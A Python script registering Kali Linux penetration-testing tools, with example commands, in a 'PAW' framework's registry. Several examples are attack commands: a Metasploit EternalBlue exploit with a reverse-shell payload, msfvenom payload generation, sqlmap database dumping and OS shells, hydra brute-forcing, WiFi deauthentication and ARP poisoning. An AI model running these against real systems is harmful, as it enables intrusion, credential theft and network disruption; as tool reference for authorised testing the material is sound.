#!/usr/bin/env python3
"""
PAW Kali Linux Tools Extension
This module adds extensive Kali Linux penetration testing tools to the PAW framework.
"""

import argparse
import json
import os
import sys
from typing import Dict, List, Any, Optional

# Try to import the PAW tools registry module
try:
    from tools_registry import get_tools_registry, register_tool
except ImportError:
    print("Error: Could not import PAW tools_registry module.")
    print("Make sure PAW is installed correctly and this script is in the correct directory.")
    print("You can install PAW by running: bash install.sh")
    sys.exit(1)

# Define tool categories
CATEGORIES = [
    "Information Gathering",
    "Vulnerability Analysis",
    "Web Application Analysis",
    "Database Assessment",
    "Password Attacks",
    "Wireless Attacks",
    "Reverse Engineering",
    "Exploitation Tools",
    "Sniffing & Spoofing",
    "Post Exploitation",
    "Forensics",
    "Reporting Tools",
    "Social Engineering Tools",
    "System Services"
]

# Comprehensive list of Kali Linux tools with detailed information
KALI_TOOLS = [
    # Information Gathering
    {
        "name": "nmap",
        "category": "Information Gathering",
        "description": "Network exploration tool and security / port scanner with extensive capabilities for discovery and security auditing",
        "common_usage": "nmap [scan type] [options] {target}",
        "examples": [
            {"description": "Basic scan", "command": "nmap 192.168.1.1"},
            {"description": "Scan a network range", "command": "nmap 192.168.1.0/24"},
            {"description": "Aggressive scan", "command": "nmap -A 192.168.1.1"},
            {"description": "OS detection", "command": "nmap -O 192.168.1.1"},
            {"description": "Service version detection", "command": "nmap -sV 192.168.1.1"},
            {"description": "Script scan", "command": "nmap --script=default 192.168.1.1"},
            {"description": "SYN Stealth scan", "command": "nmap -sS 192.168.1.0/24"},
            {"description": "UDP port scan", "command": "nmap -sU 192.168.1.1"},
            {"description": "Fast scan of most common ports", "command": "nmap -F 192.168.1.1"},
            {"description": "Full port scan", "command": "nmap -p- 192.168.1.1"},
            {"description": "Specific port scan", "command": "nmap -p 22,80,443 192.168.1.1"},
            {"description": "Scan with timing template", "command": "nmap -T4 192.168.1.0/24"},
            {"description": "Vulnerability scan", "command": "nmap --script vuln 192.168.1.1"},
            {"description": "Save output to file", "command": "nmap -oA results 192.168.1.1"},
            {"description": "Evade firewalls", "command": "nmap -sS -Pn -D RND:5 --spoof-mac 0 192.168.1.1"},
            {"description": "Service enumeration", "command": "nmap -sV --version-intensity 9 192.168.1.1"}
        ]
    },
    {
        "name": "dmitry",
        "category": "Information Gathering",
        "description": "DMitry (Deepmagic Information Gathering Tool) gathers information about hosts",
        "common_usage": "dmitry [options] {target}",
        "examples": [
            {"description": "Basic information", "command": "dmitry example.com"},
            {"description": "Whois lookup", "command": "dmitry -w example.com"},
            {"description": "Netcraft search", "command": "dmitry -n example.com"},
            {"description": "Search for subdomains", "command": "dmitry -s example.com"},
            {"description": "Port scan", "command": "dmitry -p example.com"}
        ]
    },
    {
        "name": "recon-ng",
        "category": "Information Gathering",
        "description": "Full-featured reconnaissance framework",
        "common_usage": "recon-ng",
        "examples": [
            {"description": "Start recon-ng", "command": "recon-ng"},
            {"description": "Use a workspace", "command": "workspaces create example"}
        ]
    },
    {
        "name": "theHarvester",
        "category": "Information Gathering",
        "description": "E-mail, subdomain and people gathering tool",
        "common_usage": "theHarvester -d {domain} -l {limit} -b {source}",
        "examples": [
            {"description": "Basic search", "command": "theHarvester -d example.com -l 500 -b google"},
            {"description": "Search with all sources", "command": "theHarvester -d example.com -l 500 -b all"}
        ]
    },
    
    # Vulnerability Analysis
    {
        "name": "nikto",
        "category": "Vulnerability Analysis",
        "description": "Web server scanner which performs comprehensive tests",
        "common_usage": "nikto -h {target}",
        "examples": [
            {"description": "Basic scan", "command": "nikto -h http://example.com"},
            {"description": "Tuning for specific tests", "command": "nikto -h http://example.com -Tuning 1,2,3"}
        ]
    },
    {
        "name": "lynis",
        "category": "Vulnerability Analysis",
        "description": "Security auditing tool for Unix/Linux systems",
        "common_usage": "lynis [command] [options]",
        "examples": [
            {"description": "System audit", "command": "lynis audit system"},
            {"description": "Security scan", "command": "lynis --quick"}
        ]
    },
    
    # Web Application Analysis
    {
        "name": "sqlmap",
        "category": "Web Application Analysis",
        "description": "Automatic SQL injection tool for detecting and exploiting SQL injection flaws and taking over database servers",
        "common_usage": "sqlmap -u {url} [options]",
        "examples": [
            {"description": "Basic scan", "command": "sqlmap -u \"http://example.com/page.php?id=1\""},
            {"description": "Dump database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --dump"},
            {"description": "List databases", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --dbs"},
            {"description": "Target specific database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname --tables"},
            {"description": "List tables in database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname --tables"},
            {"description": "Get columns of a table", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname -T tablename --columns"},
            {"description": "Dump table data", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname -T tablename --dump"},
            {"description": "Use POST request", "command": "sqlmap -u \"http://example.com/login.php\" --data=\"username=test&password=test\""},
            {"description": "Use cookie", "command": "sqlmap -u \"http://example.com/admin/\" --cookie=\"PHPSESSID=1234abcd\""},
            {"description": "Test form auto-detection", "command": "sqlmap -u \"http://example.com/login.php\" --forms"},
            {"description": "Use HTTP authentication", "command": "sqlmap -u \"http://example.com/admin/\" --auth-type=basic --auth-cred=\"admin:password\""},
            {"description": "Use proxy", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --proxy=http://127.0.0.1:8080"},
            {"description": "Run OS commands", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --os-cmd=\"id\""},
            {"description": "Get shell", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --os-shell"},
            {"description": "Use Tor anonymity", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --tor --tor-type=socks5"},
            {"description": "Crawl site for injection points", "command": "sqlmap -u \"http://example.com/\" --crawl=3"}
        ]
    },
    {
        "name": "wpscan",
        "category": "Web Application Analysis",
        "description": "WordPress Security Scanner",
        "common_usage": "wpscan --url {url} [options]",
        "examples": [
            {"description": "Basic scan", "command": "wpscan --url http://wordpress-site.com"},
            {"description": "Enumerate users", "command": "wpscan --url http://wordpress-site.com --enumerate u"}
        ]
    },
    {
        "name": "dirb",
        "category": "Web Application Analysis",
        "description": "Web content scanner using dictionary files",
        "common_usage": "dirb {url} [wordlist] [options]",
        "examples": [
            {"description": "Basic scan", "command": "dirb http://example.com"},
            {"description": "Custom wordlist", "command": "dirb http://example.com /path/to/wordlist.txt"}
        ]
    },
    
    # Password Attacks
    {
        "name": "hydra",
        "category": "Password Attacks",
        "description": "Parallelized login cracker which supports numerous protocols and services for brute force attacks",
        "common_usage": "hydra -l {username}|-L {userlist} -p {password}|-P {passwordlist} {target} {protocol}",
        "examples": [
            {"description": "SSH attack", "command": "hydra -l admin -P /path/to/wordlist.txt ssh://192.168.1.1"},
            {"description": "Web form attack", "command": "hydra -l admin -P /path/to/wordlist.txt http-post-form \"login.php:username=^USER^&password=^PASS^:Login failed\""},
            {"description": "FTP attack", "command": "hydra -L users.txt -P passwords.txt ftp://192.168.1.1"},
            {"description": "SMB attack", "command": "hydra -l administrator -P /path/to/wordlist.txt smb://192.168.1.1"},
            {"description": "RDP attack", "command": "hydra -L users.txt -P passwords.txt rdp://192.168.1.1"},
            {"description": "HTTP basic auth", "command": "hydra -L users.txt -P passwords.txt http-get://192.168.1.1/admin/"},
            {"description": "MySQL attack", "command": "hydra -l root -P passwords.txt mysql://192.168.1.1"},
            {"description": "SMTP attack", "command": "hydra -l user@example.com -P passwords.txt smtp://mail.example.com"},
            {"description": "Attack with verbose output", "command": "hydra -v -l admin -P passwords.txt ssh://192.168.1.1"},
            {"description": "Limit parallel tasks", "command": "hydra -t 4 -l admin -P passwords.txt ssh://192.168.1.1"},
            {"description": "Continue from last attempt", "command": "hydra -R -l admin -P large_wordlist.txt ssh://192.168.1.1"},
            {"description": "Use proxy", "command": "hydra -l admin -P passwords.txt -s 8080 http-proxy://192.168.1.1"}
        ]
    },
    {
        "name": "john",
        "category": "Password Attacks",
        "description": "John the Ripper password cracker",
        "common_usage": "john [options] {password-file}",
        "examples": [
            {"description": "Basic crack", "command": "john hashes.txt"},
            {"description": "Using wordlist", "command": "john --wordlist=/path/to/wordlist.txt hashes.txt"}
        ]
    },
    {
        "name": "hashcat",
        "category": "Password Attacks",
        "description": "Advanced password recovery tool",
        "common_usage": "hashcat [options] {hash-file} [dictionary,mask,directory]",
        "examples": [
            {"description": "Dictionary attack", "command": "hashcat -m 0 -a 0 hashes.txt /path/to/wordlist.txt"},
            {"description": "Brute force attack", "command": "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a"}
        ]
    },
    
    # Wireless Attacks
    {
        "name": "aircrack-ng",
        "category": "Wireless Attacks",
        "description": "Complete suite for auditing wireless networks, including packet capture, attack, testing, and cracking",
        "common_usage": "aircrack-ng [options] <capture file(s)>",
        "examples": [
            {"description": "WPA handshake crack", "command": "aircrack-ng -w /path/to/wordlist.txt capture.cap"},
            {"description": "WEP key crack", "command": "aircrack-ng -a 1 -b 00:11:22:33:44:55 capture.cap"},
            {"description": "Start monitor mode", "command": "airmon-ng start wlan0"},
            {"description": "Scan for networks", "command": "airodump-ng wlan0mon"},
            {"description": "Targeted network capture", "command": "airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon"},
            {"description": "Deauthenticate clients", "command": "aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0mon"},
            {"description": "Filter by ESSID", "command": "aircrack-ng -e \"TargetNetwork\" -w /path/to/wordlist.txt capture.cap"},
            {"description": "Crack with GPU acceleration", "command": "aircrack-ng -w /path/to/wordlist.txt -b 00:11:22:33:44:55 --gpu-accel=N capture.cap"},
            {"description": "WPA attack with hashcat format", "command": "aircrack-ng -J output_hashcat capture.cap"},
            {"description": "WPS PIN attack", "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv"}
        ]
    },
    {
        "name": "wifite",
        "category": "Wireless Attacks",
        "description": "Automated wireless attack tool",
        "common_usage": "wifite [options]",
        "examples": [
            {"description": "Attack all networks", "command": "wifite"},
            {"description": "Target WPA only", "command": "wifite --wpa"}
        ]
    },
    
    # Exploitation Tools
    {
        "name": "metasploit",
        "category": "Exploitation Tools",
        "description": "Advanced open-source platform for developing, testing, and executing exploits against target systems",
        "common_usage": "msfconsole [options]",
        "examples": [
            {"description": "Start Metasploit", "command": "msfconsole"},
            {"description": "Use a module", "command": "use exploit/multi/handler"},
            {"description": "Start with resource script", "command": "msfconsole -r script.rc"},
            {"description": "Quiet mode", "command": "msfconsole -q"},
            {"description": "Set up reverse shell handler", "command": "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"},
            {"description": "Search for exploits", "command": "search type:exploit platform:windows cve:2021"},
            {"description": "Exploit a target", "command": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; exploit"},
            {"description": "Database integration with nmap", "command": "db_nmap -sV 192.168.1.0/24"},
            {"description": "List discovered hosts", "command": "hosts"},
            {"description": "List discovered services", "command": "services"},
            {"description": "List vulnerabilities", "command": "vulns"},
            {"description": "Generate a payload", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"},
            {"description": "Load auxiliary module", "command": "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run"},
            {"description": "Post-exploitation command", "command": "run post/windows/gather/hashdump"}
        ]
    },
    {
        "name": "searchsploit",
        "category": "Exploitation Tools",
        "description": "Command line search tool for Exploit-DB",
        "common_usage": "searchsploit [options] {term}",
        "examples": [
            {"description": "Basic search", "command": "searchsploit apache 2.4.7"},
            {"description": "Exact match", "command": "searchsploit -e \"WordPress 5.0\""}
        ]
    },
    
    # Sniffing & Spoofing
    {
        "name": "wireshark",
        "category": "Sniffing & Spoofing",
        "description": "Network protocol analyzer",
        "common_usage": "wireshark [options] [capture filter]",
        "examples": [
            {"description": "Start Wireshark", "command": "wireshark"},
            {"description": "Capture with filter", "command": "wireshark -i eth0 -f \"port 80\""}
        ]
    },
    {
        "name": "ettercap",
        "category": "Sniffing & Spoofing",
        "description": "Suite for man-in-the-middle attacks",
        "common_usage": "ettercap [options] [target1] [target2]",
        "examples": [
            {"description": "Graphical interface", "command": "ettercap -G"},
            {"description": "ARP poisoning", "command": "ettercap -T -q -M arp:remote /192.168.1.1/ /192.168.1.2/"}
        ]
    },
    
    # Post Exploitation
    {
        "name": "empire",
        "category": "Post Exploitation",
        "description": "PowerShell post-exploitation framework",
        "common_usage": "empire",
        "examples": [
            {"description": "Start Empire", "command": "empire"},
            {"description": "Use a listener", "command": "uselistener http"}
        ]
    },
    
    # Forensics
    {
        "name": "autopsy",
        "category": "Forensics",
        "description": "Digital forensics platform and GUI for The Sleuth Kit",
        "common_usage": "autopsy",
        "examples": [
            {"description": "Start Autopsy", "command": "autopsy"}
        ]
    },
    {
        "name": "foremost",
        "category": "Forensics",
        "description": "Recover files using their headers and footers",
        "common_usage": "foremost -i {input} -o {output}",
        "examples": [
            {"description": "Basic recovery", "command": "foremost -i /dev/sdb -o /path/to/output"}
        ]
    },
    
    # Reporting Tools
    {
        "name": "dradis",
        "category": "Reporting Tools",
        "description": "Reporting and collaboration tool",
        "common_usage": "dradis",
        "examples": [
            {"description": "Start Dradis", "command": "dradis"}
        ]
    },
    {
        "name": "ffuf",
        "category": "Web Application Analysis",
        "description": "Fast web fuzzer for discovering hidden files, directories, subdomains, and parameters in web applications",
        "common_usage": "ffuf -w {wordlist} -u {url}",
        "examples": [
            {"description": "Directory discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ"},
            {"description": "File discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ.php"},
            {"description": "Subdomain enumeration", "command": "ffuf -w /path/to/wordlist.txt -u http://FUZZ.example.com"},
            {"description": "Parameter discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/script.php?FUZZ=test"},
            {"description": "Value fuzzing", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/script.php?id=FUZZ"},
            {"description": "POST data fuzzing", "command": "ffuf -w /path/to/wordlist.txt -X POST -d \"username=admin&password=FUZZ\" -u http://example.com/login"},
            {"description": "Filter by size", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -fs 4242"},
            {"description": "Filter by status code", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -fc 404"},
            {"description": "Multiple wordlists", "command": "ffuf -w user.txt:USER -w pass.txt:PASS -u http://example.com/login -X POST -d \"username=USER&password=PASS\""},
            {"description": "Recursion", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -recursion"},
            {"description": "Use custom headers", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -H \"X-Forwarded-For: 127.0.0.1\""},
            {"description": "Output to file", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -o results.json -of json"}
        ]
    }
    # Many more tools can be added here...
]

def add_extensive_kali_tools(only_show: bool = False) -> List[Dict[str, Any]]:
    """
    Add extensive Kali Linux tools to the PAW registry.
    
    Args:
        only_show: If True, only show tools that would be added without actually adding them
        
    Returns:
        List of tools that would be or were added
    """
    registry = get_tools_registry()
    existing_tools = {tool["name"].lower(): tool for tool in registry}
    
    tools_to_add = []
    
    for tool in KALI_TOOLS:
        if tool["name"].lower() not in existing_tools:
            tools_to_add.append(tool)
            if not only_show:
                register_tool(tool)
    
    return tools_to_add

def export_tools(output_file: str) -> None:
    """
    Export all tools to a JSON file.
    
    Args:
        output_file: Path to the output JSON file
    """
    registry = get_tools_registry()
    
    with open(output_file, 'w') as f:
        json.dump(registry, f, indent=4)
    
    print(f"Exported {len(registry)} tools to {output_file}")

def import_tools(input_file: str, only_show: bool = False) -> List[Dict[str, Any]]:
    """
    Import tools from a JSON file.
    
    Args:
        input_file: Path to the input JSON file
        only_show: If True, only show tools that would be added without actually adding them
        
    Returns:
        List of tools that would be or were added
    """
    registry = get_tools_registry()
    existing_tools = {tool["name"].lower(): tool for tool in registry}
    
    with open(input_file, 'r') as f:
        import_tools = json.load(f)
    
    tools_to_add = []
    
    for tool in import_tools:
        if tool["name"].lower() not in existing_tools:
            tools_to_add.append(tool)
            if not only_show:
                register_tool(tool)
    
    return tools_to_add

def categorize_tools(tools: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
    """
    Categorize tools by their category.
    
    Args:
        tools: List of tool dictionaries
    
    Returns:
        Dictionary mapping categories to lists of tools
    """
    categories = {}
    
    for tool in tools:
        category = tool.get("category", "Uncategorized")
        if category not in categories:
            categories[category] = []
        categories[category].append(tool)
    
    return categories

def print_categorized_tools(categorized_tools: Dict[str, List[Dict[str, Any]]]) -> None:
    """
    Print tools categorized by their category.
    
    Args:
        categorized_tools: Dictionary mapping categories to lists of tools
    """
    print("\nTools by Category:")
    print("-----------------")
    
    for category, tools in sorted(categorized_tools.items()):
        print(f"\n{category} ({len(tools)} tools):")
        for tool in sorted(tools, key=lambda x: x["name"]):
            print(f"  - {tool['name']}: {tool['description']}")

def main() -> None:
    """
    Main function to parse arguments and perform actions.
    """
    parser = argparse.ArgumentParser(description="PAW Kali Linux Tools Extension")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--show", action="store_true", help="Show tools that would be added without adding them")
    group.add_argument("--export", metavar="FILE", help="Export all tools to a JSON file")
    group.add_argument("--import", dest="import_file", metavar="FILE", help="Import tools from a JSON file")
    args = parser.parse_args()
    
    if args.show:
        tools_to_add = add_extensive_kali_tools(only_show=True)
        if tools_to_add:
            print(f"\nFound {len(tools_to_add)} new tools to add:")
            categorized_tools = categorize_tools(tools_to_add)
            print_categorized_tools(categorized_tools)
            print(f"\nRun without --show to add these {len(tools_to_add)} tools to the registry.")
        else:
            print("\nAll tools are already registered.")
    
    elif args.export:
        export_tools(args.export)
    
    elif args.import_file:
        tools_to_add = import_tools(args.import_file, only_show=args.show)
        if tools_to_add:
            print(f"\nImported {len(tools_to_add)} new tools from {args.import_file}")
            categorized_tools = categorize_tools(tools_to_add)
            print_categorized_tools(categorized_tools)
        else:
            print("\nAll tools from the import file are already registered.")
    
    else:
        tools_to_add = add_extensive_kali_tools(only_show=False)
        if tools_to_add:
            print(f"\nAdded {len(tools_to_add)} new tools to the PAW registry.")
            categorized_tools = categorize_tools(tools_to_add)
            print_categorized_tools(categorized_tools)
        else:
            print("\nAll tools are already registered.")

if __name__ == "__main__":
    main() 